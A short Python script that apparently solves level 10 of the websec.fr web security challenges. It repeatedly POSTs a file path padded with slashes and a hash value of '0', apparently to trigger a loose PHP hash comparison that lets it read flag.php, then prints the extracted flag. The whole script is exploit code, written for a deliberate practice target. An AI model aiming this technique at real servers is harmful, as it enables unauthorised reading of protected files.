import requests

url = "http://websec.fr/level10/index.php"
body = {'f':'','hash':'0'}
FLAG = ""


def get_flag():
	global FALG
	for i in range(10000000):
		body['f'] = "/" * i+ "flag.php"
		res = requests.post(url, data=body)
		if "Permission denied!" not in res.text:
			FLAG = res.text.split(">")[58].split("\"")[1]
			print("[-] FLAG : {}".format(FLAG))
			print("[+] Exploit Success!")
			break

if __name__ == '__main__':
	print("[+] Exploit Start")
	get_flag()